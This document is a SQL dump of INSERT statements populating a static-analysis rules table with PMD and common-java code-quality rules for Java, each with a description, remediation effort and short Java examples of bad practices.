INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (28, 'Skipped unit tests should be either removed or fixed', 'SkippedUnitTests', NULL, 'common-java', 'Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, 'number of skipped tests', NULL, 'pitfall', false, 'HTML', 1510817811363, 1510817811364, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (29, 'Failed unit tests should be fixed', 'FailedUnitTests', NULL, 'common-java', 'Test failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, 'number of failed tests', NULL, NULL, false, 'HTML', 1510817811366, 1510817811367, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (30, 'Avoid Losing Exception Information', 'AvoidLosingExceptionInformation', 'rulesets/java/strictexception.xml/AvoidLosingExceptionInformation', 'pmd', 'Statements in a catch block that invoke accessors on the exception without using the information only add to code size.  Either remove the invocation, or use the return result.

<p>
This rule is deprecated, use {rule:squid:S1166} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811370, 1510817811371, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (31, 'Unsynchronized Static Date Formatter', 'UnsynchronizedStaticDateFormatter', 'rulesets/java/design.xml/UnsynchronizedStaticDateFormatter', 'pmd', 'SimpleDateFormat is not synchronized. Sun recomends separate format instances for each thread. If multiple threads must access a static formatter, the formatter must be synchronized either on method or block level.

<p>
  This rule is deprecated, use {rule:squid:S2156} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'multithreading', false, 'HTML', 1510817811373, 1510817811375, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (32, 'Message Driven Bean And Session Bean Naming Convention', 'MDBAndSessionBeanNamingConvention', 'rulesets/java/j2ee.xml/MDBAndSessionBeanNamingConvention', 'pmd', 'The EJB Specification state that any MessageDrivenBean or SessionBean should be suffixed by Bean.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811377, 1510817811378, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (33, 'Double checked locking', 'DoubleCheckedLocking', 'rulesets/java/basic.xml/DoubleCheckedLocking', 'pmd', 'Partially created objects can be returned by the Double Checked Locking pattern when used in Java. An optimizing JRE may assign a reference to the baz variable before it creates the object the reference is intended to point to. <a href="http://www.javaworld.com/javaworld/jw-02-2001/jw-0209-double.html">More details</a>. Example :
<pre>
public class Foo {
  Object baz;
  Object bar() {
    if(baz == null) { //baz may be non-null yet not fully created
      synchronized(this){
        if(baz == null){
          baz = new Object();
        }
      }
    }
    return baz;
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'multithreading', false, 'HTML', 1510817811380, 1510817811381, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (34, 'Remote Session Interface Naming Convention', 'RemoteSessionInterfaceNamingConvention', 'rulesets/java/j2ee.xml/RemoteSessionInterfaceNamingConvention', 'pmd', 'Remote Home interface of a Session EJB should be suffixed by "Home".', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811383, 1510817811384, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (46, 'Excessive Class Length', 'ExcessiveClassLength', 'rulesets/java/codesize.xml/ExcessiveClassLength', 'pmd', 'Long Class files are indications that the class may be trying to do too much. Try to break it down, and reduce the size to something manageable.

<p>
  This rule is deprecated, use {rule:squid:S1448} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'size', false, 'HTML', 1510817811414, 1510817811419, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (35, 'Avoid Protected Method In Final Class Not Extending', 'AvoidProtectedMethodInFinalClassNotExtending', 'rulesets/java/design.xml/AvoidProtectedMethodInFinalClassNotExtending', 'pmd', 'Do not use protected methods in most final classes since they cannot be subclassed. This should 
only be allowed in final classes that extend other classes with protected methods (whose
visibility cannot be reduced). Clarify your intent by using private or package access modifiers instead. Example: 
<pre>
public final class Foo {
  private int bar() {}
  protected int baz() {} // Foo cannot be subclassed, and doesn''t extend anything, so is baz() really private or package visible? 
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S2156} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811387, 1510817811388, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (36, 'Use Object For Clearer API', 'UseObjectForClearerAPI', 'rulesets/java/controversial.xml/UseObjectForClearerAPI', 'pmd', 'When you write a public method, you should be thinking in terms of an API. If your method is public, it means other class
will use it, therefore, you want (or need) to offer a comprehensive and evolutive API. If you pass a lot of information
as a simple series of Strings, you may think of using an Object to represent all those information. You''ll get a simplier
API (such as doWork(Workload workload), rather than a tedious series of Strings) and more importantly, if you need at some
point to pass extra data, you''ll be able to do so by simply modifying or extending Workload without any modification to
your API. Example: 
<pre>
public class MyClass {
  public void connect(String username,
    String pssd,
    String databaseName,
    String databaseAdress)
    // Instead of those parameters object
    // would ensure a cleaner API and permit
    // to add extra data transparently (no code change):
    // void connect(UserData data);
    {

  }
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S00107} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811390, 1510817811390, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (37, 'For Loop Should Be While Loop', 'ForLoopShouldBeWhileLoop', 'rulesets/java/basic.xml/ForLoopShouldBeWhileLoop', 'pmd', 'Some for loops can be simplified to while loops - this makes them more concise.

<p>
  This rule is deprecated, use {rule:squid:S1264} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811392, 1510817811393, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (38, 'Avoid Throwing Raw Exception Types', 'AvoidThrowingRawExceptionTypes', 'rulesets/java/strictexception.xml/AvoidThrowingRawExceptionTypes', 'pmd', '<p>
Avoid throwing certain exception types. Rather than throw a raw RuntimeException, Throwable, Exception, or Error, use a subclassed exception or error instead.
</p>

<p>
This rule is deprecated, use {rule:squid:S00112} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'error-handling', false, 'HTML', 1510817811394, 1510817811395, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (39, 'Bean Members Should Serialize', 'BeanMembersShouldSerialize', 'rulesets/java/javabeans.xml/BeanMembersShouldSerialize', 'pmd', 'If a class is a bean, or is referenced by a bean directly or indirectly it needs to be serializable. Member variables need to be marked as transient, static, or have accessor methods in the class. Marking variables as transient is the safest and easiest modification. Accessor methods should follow the Java naming conventions, i.e.if you have a variable foo, you should provide getFoo and setFoo methods.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817811397, 1510817811398, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (40, 'Naming - Avoid dollar signs', 'AvoidDollarSigns', 'rulesets/java/naming.xml/AvoidDollarSigns', 'pmd', '<p>
Avoid using dollar signs in variable/method/class/interface names.
</p>

<p>
This rule is deprecated, use {rule:squid:S00114}, {rule:squid:S00115}, {rule:squid:S00116} and {rule:squid:S00117} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811400, 1510817811401, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (50, 'Empty While Stmt', 'EmptyWhileStmt', 'rulesets/java/empty.xml/EmptyWhileStmt', 'pmd', 'Empty While Statement finds all instances where a while statement does nothing. If it is a timing loop, then you should use Thread.sleep() for it; if it''s a while loop that does a lot in the exit expression, rewrite it to make it clearer.

<p>
This rule is deprecated, use {rule:squid:S00108} instead.
</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811429, 1510817811430, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (51, 'Avoid Literals In If Condition', 'AvoidLiteralsInIfCondition', 'rulesets/java/controversial.xml/AvoidLiteralsInIfCondition', 'pmd', 'Avoid using hard coded literals in conditional statements, declare those as static variables or private members.

<p>
  This rule is deprecated, use {rule:squid:S109} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811431, 1510817811432, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (52, 'Use String Buffer Length', 'UseStringBufferLength', 'rulesets/java/strings.xml/UseStringBufferLength', 'pmd', 'Use StringBuffer.length() to determine StringBuffer length rather than using StringBuffer.toString().equals() or StringBuffer.toString().length() ==.', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811433, 1510817811434, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (53, 'Bad Comparison', 'BadComparison', 'rulesets/java/design.xml/BadComparison', 'pmd', 'Avoid equality comparisons with Double.NaN - these are likely to be logic errors.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811441, 1510817811442, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (54, 'Avoid Multiple Unary Operators', 'AvoidMultipleUnaryOperators', 'rulesets/java/basic.xml/AvoidMultipleUnaryOperators', 'pmd', 'Using multiple unary operators may be a bug, and/or is confusing. Check the usage is not a bug, or consider simplifying the expression. Example :
<pre>
// These are typo bugs, or at best needlessly complex and confusing:
int i = - -1;
int j = + - +1;
int z = ~~2;
boolean b = !!true;
boolean c = !!!true;

// These are better:
int i = 1;
int j = -1;
int z = 2;
boolean b = true;
boolean c = false;

// And these just make your brain hurt:
int i = ~-2;
int j = -~7;
</pre>

<p>
This rule is deprecated, use {rule:squid:S881} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811443, 1510817811444, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (55, 'Unused Private Field', 'UnusedPrivateField', 'rulesets/java/unusedcode.xml/UnusedPrivateField', 'pmd', 'Detects when a private field is declared and/or assigned a value, but not used.

<p>
This rule is deprecated, use {rule:squid:S1068} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'unused-code', false, 'HTML', 1510817811445, 1510817811446, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (56, 'Comment Size', 'CommentSize', 'rulesets/java/comments.xml/CommentSize', 'pmd', 'Determines whether the dimensions of non-header comments found are within the specified limits. Example: 
<pre>
/**
*
* too many lines!
*
*
*
*
*
*
*
*
*
*
*
*
*/
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811447, 1510817811448, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (57, 'Switch Density', 'SwitchDensity', 'rulesets/java/design.xml/SwitchDensity', 'pmd', 'A high ratio of statements to labels in a switch statement implies that the switch statement is doing too much work. Consider moving the statements into new methods, or creating subclasses based on the switch variable.

<p>
This rule is deprecated, use {rule:squid:S1151} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811454, 1510817811455, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (58, 'Empty Finalizer', 'EmptyFinalizer', 'rulesets/java/finalizers.xml/EmptyFinalizer', 'pmd', '<p>If the finalize() method is empty, then it does not need to exist.</p>

<p>
This rule is deprecated, use {rule:squid:S1186} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817811466, 1510817811467, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (59, 'Check Skip Result', 'CheckSkipResult', 'rulesets/java/basic.xml/CheckSkipResult', 'pmd', 'The skip() method may skip a smaller number of bytes than requested. Check the returned value to find out if it was the case or not. Example: 
<pre>
public class Foo {

   private FileInputStream _s = new FileInputStream("file");

   public void skip(int n) throws IOException {
      _s.skip(n); // You are not sure that exactly n bytes are skipped
   }

   public void skipExactly(int n) throws IOException {
      while (n != 0) {
         long skipped = _s.skip(n);
         if (skipped == 0)
            throw new EOFException();
         n -= skipped;
      }
   }
</pre>

<p>
   This rule is deprecated, use {rule:squid:S2674} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811469, 1510817811471, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (60, 'Android - call super first', 'CallSuperFirst', 'rulesets/java/android.xml/CallSuperFirst', 'pmd', 'Super should be called at the start of the method. Example :
<pre>
public class DummyActivity extends Activity {
  public void onCreate(Bundle bundle) {
    // missing call to super.onCreate(bundle)
    foo();
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811472, 1510817811473, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (61, 'Use Locale With Case Conversions', 'UseLocaleWithCaseConversions', 'rulesets/java/design.xml/UseLocaleWithCaseConversions', 'pmd', 'When doing a String.toLowerCase()/toUpperCase() call, use a Locale. This avoids problems with certain locales, i.e. Turkish.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811474, 1510817811475, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (62, 'Static EJB Field Should Be Final', 'StaticEJBFieldShouldBeFinal', 'rulesets/java/j2ee.xml/StaticEJBFieldShouldBeFinal', 'pmd', 'According to the J2EE specification (p.494), an EJB should not have any static fields with write access. However, static read only fields are allowed. This ensures proper behavior especially when instances are distributed by the container on several JREs.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811479, 1510817811481, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (63, 'NPath complexity', 'NPathComplexity', 'rulesets/java/codesize.xml/NPathComplexity', 'pmd', 'The NPath complexity of a method is the number of acyclic execution paths through that method. A threshold of 200 is generally considered the point where measures should be taken to reduce complexity. Example :
<pre>
public class Foo {
  void bar() {
   // lots of complicated code
  }
 }
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'size', false, 'HTML', 1510817811482, 1510817811483, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (64, 'Naming - Avoid field name matching type name', 'AvoidFieldNameMatchingTypeName', 'rulesets/java/naming.xml/AvoidFieldNameMatchingTypeName', 'pmd', 'It is somewhat confusing to have a field name matching the declaring class name. This probably means that type and or field names could be more precise. Example :
<pre>
public class Foo extends Bar {
  // There''s probably a better name for foo
  int foo;
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1700} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811486, 1510817811487, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (65, 'Jumbled Incrementer', 'JumbledIncrementer', 'rulesets/java/basic.xml/JumbledIncrementer', 'pmd', 'Avoid jumbled loop incrementers - it''s usually a mistake, and it''s confusing even if it''s what''s intended.
    <br>Example :
    <pre>
public class JumbledIncrementerRule1 {
  public void foo() {
   for (int i = 0; i < 10; i++) {
    for (int k = 0; k < 20; i++) {
     System.out.println("Hello");
    }
   }
  }
}</pre>

<p>
This rule is deprecated, use {rule:squid:ForLoopCounterChangedCheck} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817811488, 1510817811490, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (66, 'Remote Interface Naming Convention', 'RemoteInterfaceNamingConvention', 'rulesets/java/j2ee.xml/RemoteInterfaceNamingConvention', 'pmd', 'Remote Interface of a Session EJB should NOT be suffixed.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811493, 1510817811494, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (67, 'Integer Instantiation', 'IntegerInstantiation', 'rulesets/java/migrating.xml/IntegerInstantiation', 'pmd', 'In JDK 1.5, calling new Integer() causes memory allocation. Integer.valueOf() is more memory friendly.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811495, 1510817811496, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (68, 'String Buffer Instantiation With Char', 'StringBufferInstantiationWithChar', 'rulesets/java/strings.xml/StringBufferInstantiationWithChar', 'pmd', 'StringBuffer sb = new StringBuffer(''c''); The char will be converted into int to intialize StringBuffer size.

<p>
  This rule is deprecated, use {rule:squid:S1317} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811497, 1510817811498, 1);
